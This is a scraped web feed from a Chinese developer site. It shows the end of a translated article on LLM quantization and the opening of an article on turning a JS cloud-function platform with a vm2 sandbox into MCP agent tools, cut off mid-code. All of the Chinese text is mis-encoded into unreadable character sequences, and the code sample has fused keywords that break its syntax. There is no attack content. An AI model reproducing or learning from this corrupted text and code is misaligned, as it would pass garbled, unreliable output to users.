<li><strong>é«˜æ€§ä»·æ¯”çš„äº‘ç«¯éƒ¨ç½²ï¼ˆCost-Efficient Cloud Deploymentï¼‰</strong> ï¼šå³ä½¿åœ¨äº‘ç«¯ï¼Œé‡åŒ–ä¹Ÿèƒ½å¤§å¹…é™ä½ GPU å†…å­˜å ç”¨ï¼Œä½¿å•ä¸ªèŠ‚ç‚¹èƒ½å¤ŸæœåŠ¡æ›´å¤šç”¨æˆ·ï¼Œå¤§å¹…èŠ‚çœè¿ç»´æˆæœ¬ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ª 13B æ¨¡å‹åœ¨ INT4 ç²¾åº¦ä¸‹çš„è¡¨ç°å‡ ä¹ä¸ FP16 ç›¸å½“ï¼Œä½† GPU å†…å­˜å ç”¨å‡å°‘äº†ä¸€åŠï¼Œè¿™æ ·ä½¿å¾—é¢„ç®—æœ‰é™çš„å›¢é˜Ÿä¹Ÿå¯ä»¥éƒ¨ç½²é«˜æ€§èƒ½çš„ LLMã€‚</li>
<li><strong>é•¿ä¸Šä¸‹æ–‡åº”ç”¨ï¼ˆLong-Context Applicationsï¼‰</strong> ï¼šé€šè¿‡é™ä½ KV ç¼“å­˜çš„å†…å­˜å ç”¨ï¼Œä½¿å¾—å¤„ç†é•¿æ–‡æ¡£æˆä¸ºå¯èƒ½ã€‚å€ŸåŠ© INT8 æˆ– INT4 çš„ KV ç¼“å­˜ï¼Œæˆ‘æˆåŠŸå®ç°äº†æ•´æœ¬ä¹¦ç±çš„æ‘˜è¦ç”Ÿæˆã€åˆ†ææ³•å¾‹åˆåŒï¼Œç”šè‡³ç»´æŒæ•°å°æ—¶çš„è¿ç»­å¯¹è¯è€Œä¸ä¼šçˆ†å†…å­˜ã€‚è¿™è®©è™šæ‹ŸåŠ©æ‰‹ã€æ•™å­¦ç³»ç»Ÿå’Œæ‘˜è¦å·¥å…·èƒ½æ— ç¼å¤„ç†è¶…é•¿ä¸Šä¸‹æ–‡ã€‚</li>
<li><strong>å¤šæ¨¡å‹åä½œæµæ°´çº¿ï¼ˆMulti-Model Pipelinesï¼‰</strong> ï¼šé‡åŒ–æ¨¡å‹åœ¨æ··åˆæµæ°´çº¿ä¸­è¡¨ç°å°¤ä¸ºå‡ºè‰²ã€‚æˆ‘ç»å¸¸ç”¨å°å‹ INT4 æ¨¡å‹åšåˆæ­¥ç­›é€‰æˆ–ç”Ÿæˆåˆå§‹å»ºè®®ï¼Œå†å°†ç»“æœäº¤ç»™æ›´å¤§çš„æ¨¡å‹è¿›è¡Œæœ€ç»ˆæ¨ç†ã€‚è‹¥æ— é‡åŒ–æŠ€æœ¯ï¼Œå¹¶è¡Œè°ƒåº¦å¤šä¸ªæ¨¡å‹ä¼šå¾ˆå®¹æ˜“è¶…å‡ºå†…å­˜é™åˆ¶ã€‚è€Œç°åœ¨ï¼Œå°±åƒåœ¨ä¸€å°æœºå™¨ä¸Šéƒ¨ç½²äº†ä¸€æ•´ä¸ª AI ä¸“å®¶å›¢é˜Ÿã€‚</li>
<li><strong>ç ”ç©¶ä¸å®éªŒï¼ˆResearch and Experimentationï¼‰</strong> ï¼šæœ€åï¼Œé‡åŒ–æŠ€æœ¯è®©å®éªŒå˜å¾—æ›´å¿«é€Ÿã€æ›´ä¾¿å®œã€‚æˆ‘å¯ä»¥åœ¨æ¶ˆè´¹çº§ GPU ä¸Šè¿­ä»£æ–°æ¶æ„ã€æµ‹è¯•æ¨¡å‹æ¶ˆèå®éªŒæˆ–å¾®è°ƒæ¨¡å‹ï¼Œæ— éœ€ç­‰å¾…æ˜‚è´µçš„ä¸“ç”¨ç¡¬ä»¶ã€‚è¿™æå¤§åŠ é€Ÿäº†æˆ‘ä»¬çš„å­¦ä¹ ä¸å®éªŒè¿›ç¨‹ï¼Œè®©å¤§æ¨¡å‹ç ”ç©¶å˜å¾—æ›´åŠ è§¦æ‰‹å¯åŠã€‚</li>
</ul>
<p><strong>END</strong></p>
<p><strong>æœ¬æœŸäº’åŠ¨å†…å®¹ ğŸ»</strong></p>
<p><strong>â“ä½ è§‰å¾—æœªæ¥å¤§æ¨¡å‹ä¼šé»˜è®¤ä»¥é‡åŒ–å½¢å¼å‘å¸ƒï¼Œè¿˜æ˜¯ä¿ç•™â€œåŸå§‹ç²¾åº¦+æŒ‰éœ€é‡åŒ–â€çš„æ¨¡å¼ï¼Ÿ</strong></p>
<p><strong>æœ¬æ–‡ç»åŸä½œè€…æˆæƒï¼Œç”± Baihai IDP ç¼–è¯‘ã€‚å¦‚éœ€è½¬è½½è¯‘æ–‡ï¼Œè¯·è”ç³»è·å–æˆæƒã€‚</strong></p>
<p><strong>åŸæ–‡é“¾æ¥ï¼š</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fbhavishyapandit9.substack.com%2Fp%2Fdeep-dive-into-quantization-of-llms" target="_blank" title="https://bhavishyapandit9.substack.com/p/deep-dive-into-quantization-of-llms" ref="nofollow noopener noreferrer">bhavishyapandit9.substack.com/p/deep-diveâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»JSäº‘å‡½æ•°åˆ°MCPï¼šæ‰“é€ è·¨å¹³å°AI Agentå·¥å…·çš„å·¥ç¨‹å®è·µ]]></title>    <link>https://juejin.cn/post/7582599972950982683</link>    <guid>https://juejin.cn/post/7582599972950982683</guid>    <pubDate>2025-12-12T08:43:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582599972950982683" data-draft-id="7582422818311372851" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»JSäº‘å‡½æ•°åˆ°MCPï¼šæ‰“é€ è·¨å¹³å°AI Agentå·¥å…·çš„å·¥ç¨‹å®è·µ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-12T08:43:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“”å“©å“”å“©æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/3030701626893405"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»JSäº‘å‡½æ•°åˆ°MCPï¼šæ‰“é€ è·¨å¹³å°AI Agentå·¥å…·çš„å·¥ç¨‹å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030701626893405/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“”å“©å“”å“©æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T08:43:39.000Z" title="Fri Dec 12 2025 08:43:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ„å»º AI å·¥å…·ç”Ÿæ€è¿™ä»¶äº‹ä¸Šï¼Œè¿‡å»ä¸€å¹´æˆ‘ä»¬åšäº†ä¸å°‘å°è¯•ã€‚</p>
<p>å›å¤´çœ‹ï¼Œä¼šè§‰å¾—è¿™æ¡è·¯å¾„åƒæ˜¯åœ¨æ­å»ºä¸€æ¡è¶Šæ¥è¶Šæ¸…æ™°çš„â€œèƒ½åŠ›ç”Ÿäº§çº¿â€ï¼š</p>
<blockquote>
<p>ä»å†™ JS â†’ Agent Tool å·¥å…· â†’ æˆä¸º MCP å·¥å…· â†’ æˆä¸ºè·¨å¹³å° Agent èƒ½åŠ›ã€‚</p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å°±æŒ‰è¿™æ¡æ¼”è¿›è·¯çº¿ï¼ŒæŠŠåº•å±‚é€»è¾‘ã€è¸©å‘ç»éªŒå’Œæœ€ç»ˆçš„å·¥ç¨‹æ–¹æ¡ˆå®Œæ•´è®²æ¸…æ¥šã€‚</p>
<h2 data-id="heading-0"><strong>ä¸€ã€å…ˆåšç®€å•ä»‹ç»</strong></h2>
<p>æˆ‘ä»¬åšäº†ä¸€ä¸ªâ€œåœ¨çº¿ JS äº‘å‡½æ•°å¹³å°â€ï¼Œå®ƒçš„æœ¬è´¨æ˜¯ï¼šæŠŠå†™ä¸€ä¸ª JS å‡½æ•°ï¼Œå˜æˆç»™ AI èµ‹äºˆä¸€ä¸ª Tool æ–°èƒ½åŠ›ã€‚</p>
<p>è¿™å¥—ç³»ç»Ÿç»å†äº†ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<p><strong>1. Â ç¬¬ä¸€ç‰ˆï¼š</strong> åªæ˜¯ Flowise é‡Œçš„ä¸€ä¸ª LangChain StructuredTool æ‰©å±•ï¼Œèƒ½åœ¨å·¥ä½œæµé‡Œè¢« Agent è°ƒç”¨ã€‚</p>
<blockquote>
<p><strong>Flowise</strong>ï¼ˆ<em><a href="https://link.juejin.cn?target=https%3A%2F%2Fflowiseai.com%2F" target="_blank" title="https://flowiseai.com/" ref="nofollow noopener noreferrer">flowiseai.com/</a></em> ï¼‰ æ˜¯ä¸€æ¬¾å¼€æºã€å¯è§†åŒ–çš„ AI å·¥ä½œæµå·¥å…·ï¼Œé€šè¿‡æ‹–æ‹½èŠ‚ç‚¹å³å¯æ„å»º LLM åº”ç”¨æˆ– Agentã€‚å®ƒåº•å±‚åŸºäº LangChain çš„ TypeScript ç‰ˆæœ¬ï¼Œå› æ­¤å¤©ç„¶å…·å¤‡æ¨¡å‹è°ƒç”¨ã€å·¥å…·è°ƒç”¨ã€é“¾å¼å¤„ç†ã€è®°å¿†ä¸å‘é‡æ£€ç´¢ç­‰èƒ½åŠ›ã€‚</p>
<p>å½“æ—¶æˆ‘ä»¬åœ¨æŠ€æœ¯é€‰å‹æ—¶ä½¿ç”¨ Flowise åšAIå·¥ä½œæµå¹³å°æœ‰ä¸¤ä¸ªåŸå› ï¼š</p>
<p>ä¸€æ˜¯å®ƒåŸºäº LangChain çš„ TypeScript ç‰ˆæœ¬â€”â€”åœ¨æ—©æœŸ AI æ¡†æ¶è¿˜ä¸æˆç†Ÿæ—¶ï¼Œè¿™æ˜¯å°‘æ•°åŸç”Ÿæ”¯æŒ TS çš„æ–¹æ¡ˆï¼›äºŒæ˜¯å®ƒæä¾›äº†å¯æ‹–æ‹½çš„å¯è§†åŒ–å·¥ä½œæµï¼Œèƒ½è®©æˆ‘ä»¬å¿«é€Ÿæ­å»ºå’ŒéªŒè¯ AI åŸå‹ã€‚</p>
</blockquote>
<p><strong>2. Â ç¬¬äºŒç‰ˆï¼š</strong> æ¼”è¿›ä¸ºä¸€ä¸ªæµè§ˆå™¨é‡Œçš„ äº‘å‡½æ•° IDEï¼šåœ¨çº¿å†™ä»£ç ã€è°ƒè¯•ã€æ²™ç®±è¿è¡Œæ—¶ã€è¿å†…ç½‘ gRPC/HTTP/MySQLã€‚</p>
<p><strong>3. Â ç°åœ¨ï¼š</strong> æ¥ä¸Š MCP åè®®ï¼Œå˜æˆä¸€ä¸ªå¯ä»¥è¢«ã€Œä»»ä½•æ”¯æŒ MCP çš„ Agent / Studioã€è·¨å¹³å°è°ƒç”¨çš„ç‹¬ç«‹å·¥å…·å¹³å°ï¼Œå¹¶æ”¯æŒ SSE + Streamable HTTP ä¸¤ç§æµå¼åè®®ã€‚</p>
<h2 data-id="heading-1"><strong>äºŒã€ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦â€œAI å·¥å…·èƒ½åŠ›å±‚â€ï¼Ÿ</strong></h2>
<p>åœ¨æˆ‘ä»¬å†…éƒ¨æ„å»º AI åº”ç”¨ï¼ˆå®¢æœã€ç›´æ’­è¿è¥åŠ©æ‰‹ç­‰ï¼‰æ—¶ï¼Œé‡åˆ°å‡ ä¸ªéå¸¸å…¸å‹çš„ç—›ç‚¹ã€‚</p>
<h3 data-id="heading-2"><strong>1. å·¥å…·å¾ˆå¤šï¼Œä½†æ¯æ¥ä¸€æ¬¡ AIï¼Œéƒ½è¦é‡å†™ä¸€éå·¥å…·</strong></h3>
<ul>
<li>æƒ³è®© AI æŸ¥å¼€æ’­çŠ¶æ€ã€æŸ¥å¡é¡¿ã€æŸ¥ç¨¿ä»¶ã€ç»™ç”¨æˆ·å‘é€šçŸ¥â€¦â€¦</li>
<li>åç«¯èƒ½åŠ›å…¶å®éƒ½æœ‰ï¼Œä½†æ¯æ¥ä¸€ä¸ªæ–°æ™ºèƒ½ä½“ï¼Œå°±è¦ï¼š</li>
</ul>

<ul>
<li>åœ¨æŸä¸ªé¡¹ç›®é‡Œå†å†™ä¸€éè°ƒç”¨ä»£ç </li>
<li>æ‰‹åŠ¨å†™ç»“æ„åŒ–å‚æ•° / è¿”å›å€¼</li>
<li>æ ¡éªŒã€é‰´æƒ</li>
</ul>

<ul>
<li>æ¯ä¸ªå›¢é˜Ÿéƒ½é‡æ–°å†™ä¸€é</li>
</ul>
<h3 data-id="heading-3"><strong>2. AI éœ€è¦çš„æ˜¯â€œèƒ½åŠ›â€ï¼Œè€Œä¸æ˜¯â€œæ¥å£â€</strong></h3>
<p>ä¸šåŠ¡æ¥å£å¾€å¾€æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">GETÂ /room/info?<span class="hljs-attr">roomid</span>=<span class="hljs-number">123</span>
</code></pre>
<p>ä½†æ˜¯ç”¨æˆ·å´ä¼šè¯´ï¼šâ€œæŸ¥ä¸€ä¸‹imzeroooå¼€æ’­çŠ¶æ€â€</p>
<p>è¿™ä¸­é—´çš„è‡ªç„¶è¯­è¨€ â†’ å‚æ•°çš„è¯­ä¹‰æ˜ å°„ï¼Œå¾ˆéš¾é ç®€å•è§„åˆ™å®Œæˆã€‚</p>
<p>å¦‚æœè®©å¼€å‘è€…ç›´æ¥æš´éœ²æ¥å£ï¼ŒAI æ˜¯å¾ˆéš¾ç”¨å¥½çš„ã€‚</p>
<h3 data-id="heading-4"><strong>3. JSON ä¸æ˜¯ AI å‹å¥½çš„è¾“å…¥æ ¼å¼</strong></h3>
<p>å†…ç½‘æ¥å£é€šå¸¸è¿”å›ä¸€å¤§å¨ JSONã€‚LLM è§£æ JSON æ²¡é—®é¢˜ï¼Œä½†ï¼š</p>
<ul>
<li>
<p>å­—æ®µå¤šã€åµŒå¥—æ·± â†’ å®¹æ˜“ä¸¢å­—æ®µ</p>
</li>
<li>
<p>å­—æ®µåæ‚ä¹± â†’ æ¨¡å‹è®°ä¸ä½</p>
</li>
<li>
<p>æ–‡æœ¬å†…å®¹å¤š â†’ å®¹æ˜“äº§ç”Ÿå¹»è§‰</p>
</li>
</ul>
<p>AI å‹å¥½çš„æ ¼å¼æ˜¯ï¼š</p>
<ul>
<li>Markdown è¡¨æ ¼</li>
<li>ç®€æ´çš„è‡ªç„¶è¯­è¨€</li>
<li>æç‚¼è¿‡çš„ä¿¡æ¯</li>
</ul>
<p>è€Œä¸æ˜¯æ•´åŒ… JSONã€‚</p>
<h3 data-id="heading-5"><strong>4. å·¥å…·æ²¡æœ‰åšæˆâ€œèµ„äº§å±‚â€</strong></h3>
<p>ä»¥å‰çš„å·¥å…·è¦ä¹ˆï¼š</p>
<ul>
<li>ç»‘æ­»åœ¨æŸä¸ª AI å·¥ä½œæµä¸Š</li>
<li>åŸ‹åœ¨æŸä¸ªé¡¹ç›®é‡Œ</li>
<li>æ”¾åœ¨æŸä¸ªä¸šåŠ¡è„šæœ¬ä¸­</li>
</ul>
<p>æ— æ³•åƒèµ„äº§ä¸€æ ·å¤ç”¨ã€‚</p>
<p>æ‰€ä»¥ä¸€åˆ‡é—®é¢˜çš„æ ¸å¿ƒå…¶å®æ˜¯ï¼š</p>
<blockquote>
<p>ç¼ºå°‘ä¸€ä¸ªå¯ä»¥å†™å·¥å…·ã€ç®¡ç†å·¥å…·ã€å‘å¸ƒå·¥å…·ã€å¤ç”¨å·¥å…·çš„ç»Ÿä¸€èƒ½åŠ›å±‚ã€‚</p>
</blockquote>
<p>è€Œæˆ‘ä»¬åšçš„ï¼Œå°±æ˜¯è®©è¿™ä»¶äº‹ï¼š<strong>åªéœ€å†™ä¸€æ®µ JS å‡½æ•°</strong>ã€‚</p>
<h2 data-id="heading-6"><strong>ä¸‰ã€ç¬¬ä¸€ç‰ˆï¼šStructuredToolâ€”â€”</strong> <strong>å·¥å…·èƒ½åŠ›çš„èŒèŠ½</strong></h2>
<p>æœ€åˆæˆ‘ä»¬æ˜¯åœ¨ Flowise é‡Œå†™ StructuredTool ç»„ä»¶ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72ced04a48494603918827c4122ede20~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=XtYbdQtaGdZM%2FUDGapbs6%2FslHaY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Flowise åº•å±‚åŸºäº LangChainï¼Œæ‰€ä»¥æˆ‘ä»¬å†™äº†å¾ˆå¤š StructuredToolï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c02f6d395f04297a837fc8d5cc1a732~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=QEbEADudVWccw550Eu1boTTu7bo%3D" alt="æˆªå±2025-12-12 15.43.12.png" loading="lazy"/></p>
<p>è¿™ä¸€ç‰ˆæœ‰å‡ ä¸ªä¼˜ç‚¹ï¼š</p>
<ul>
<li>
<p>å·¥å…·èƒ½è¢« Agent è°ƒç”¨</p>
</li>
<li>
<p>å‚æ•°æœ‰ schema</p>
</li>
<li>
<p>æœ‰ä¸€å®šçš„æ¨¡å—åŒ–</p>
</li>
</ul>
<p>ä½†æœ‰å‡ ä¸ªå±€é™ï¼š</p>
<ul>
<li>
<p>å·¥å…·ç”Ÿå‘½å‘¨æœŸè·Ÿ Flowise é¡¹ç›®ç»‘æ­»</p>
</li>
<li>
<p>è¦å†™ TSã€å†™ Node é¡¹ç›®ï¼Œå¯¹æ•ˆç‡å¾ˆä¸å‹å¥½</p>
</li>
<li>
<p>æ— æ³•è·¨å¹³å°ä½¿ç”¨</p>
</li>
<li>
<p>JSON å¤„ç†è¿˜æ˜¯è¦è‡ªå·±å†™</p>
</li>
<li>
<p>æ— æ³•æ³¨å…¥é€šç”¨èƒ½åŠ›ï¼ˆå¦‚å†…ç½‘ SDKï¼‰</p>
</li>
</ul>
<p>äºæ˜¯æˆ‘ä»¬å¼€å§‹è€ƒè™‘å¹³å°åŒ–ã€‚</p>
<h2 data-id="heading-7"><strong>å››ã€ç¬¬äºŒç‰ˆï¼šåœ¨çº¿ JS äº‘å‡½æ•°å¹³å°ï¼ˆNodeVM è¿è¡Œæ—¶ï¼‰</strong></h2>
<p>æˆ‘ä»¬æ‰“é€ äº†ä¸€å¥—å…¨æ–°çš„å¹³å°ï¼šåœ¨çº¿ JS äº‘å‡½æ•°å¹³å°ã€‚</p>
<p>å¼€å‘è€…ä¸éœ€è¦çŸ¥é“ Flowiseã€LangChainï¼Œä¹Ÿä¸ç”¨å¼€Node é¡¹ç›®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/222439794fe443fdae66e2b1fe4dc93d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=m9boE%2FVLT8PyKrzwBwNFjhVuAg4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-8"><strong>4.1 NodeVMï¼šä¸€ä¸ªå®‰å…¨å¯æ§çš„ JS æ‰§è¡Œæ²™ç®±</strong></h3>
<p>æˆ‘ä»¬åŸºäº vm2ï¼ˆNodeVMï¼‰åšäº†ä¸€ä¸ªâ€œå¯æ§çš„ JS æ‰§è¡Œç¯å¢ƒâ€ã€‚</p>
<ul>
<li>
<p>è¿è¡Œæ—¶åŸºäº StructureTool</p>
</li>
<li>
<p>NodeVM ä½œä¸ºå®‰å…¨éš”ç¦»çš„æ‰§è¡Œç¯å¢ƒ</p>
</li>
<li>
<p>è‡ªåŠ¨æ³¨å…¥ä¼ä¸šå†…éƒ¨èƒ½åŠ›ï¼ˆç»Ÿä¸€ä¸Šä¸‹æ–‡èƒ½åŠ›å±‚ï¼‰</p>
</li>
</ul>

<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**Â 
 * æ ¸å¿ƒæ€è·¯æŠ½è±¡ç‰ˆÂ 
 */</span>
<span class="hljs-keyword">import</span>Â {Â <span class="hljs-title class_">NodeVM</span>Â }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'vm2'</span>
<span class="hljs-keyword">import</span>Â {Â <span class="hljs-title class_">StructuredTool</span>Â }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'@langchain/core/tools'</span>
<span class="hljs-comment">//...</span>

classDynamicToolextendsStructuredTool {Â 
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">{ name, description, schema, code }</span>) {Â 
    <span class="hljs-variable language_">super</span>({ name, description, schema })Â 
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">code</span>Â = codeÂ <span class="hljs-comment">// ç”¨æˆ·åœ¨åœ¨çº¿ç¼–è¾‘å™¨é‡Œå†™çš„ JS ä»£ç Â </span>
  }
  
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">_call</span>(<span class="hljs-params">args, runManager, flowContext</span>) {
    <span class="hljs-comment">// 1. æ„å»ºæ²™ç®±ï¼ˆæ‰€æœ‰æ³¨å…¥èƒ½åŠ›éƒ½æ”¾åœ¨è¿™é‡Œï¼‰Â </span>
    <span class="hljs-keyword">const</span>Â sandbox = {Â 
      <span class="hljs-comment">// ç”¨æˆ·ä¼ å…¥çš„å‚æ•°è½¬æˆ $xxx</span>
      ...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">fromEntries</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(args).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">[k, v]</span>) =&gt;</span>Â [<span class="hljs-string">`$<span class="hljs-subst">${k}</span>`</span>, v])),
      
Â  Â  Â Â <span class="hljs-comment">// å†…éƒ¨ä¸Šä¸‹æ–‡ï¼ˆcookie/env/sessionï¼‰Â </span>
      <span class="hljs-attr">$flow</span>: flowContext,Â  
      <span class="hljs-attr">$cookie</span>: flowContext.<span class="hljs-property">cookie</span>,
      
Â  Â  Â Â <span class="hljs-comment">// å†…ç½‘èƒ½åŠ›å°è£…ï¼ˆgRPC/HTTPï¼‰Â </span>
      <span class="hljs-attr">$yuumi</span>: yuumi,
      
Â  Â  Â Â <span class="hljs-comment">// ç»“æœè½¬æ¢å·¥å…·ï¼ˆç”¨äºæŠŠ JSON è½¬æˆæ›´ AI å‹å¥½çš„ Markdown è¡¨æ ¼ï¼‰Â  </span>
      <span class="hljs-attr">$json2MarkdownTable</span>: json2MarkdownTable,
      
Â  Â  Â Â <span class="hljs-comment">// å†…éƒ¨ AI æ¨¡å‹Â  Â  Â </span>
      <span class="hljs-attr">$biliLLM</span>: biliLLMClientÂ  
    }
    
Â  Â Â <span class="hljs-comment">// 2. æ„å»º NodeVM æ²™ç®±Â </span>
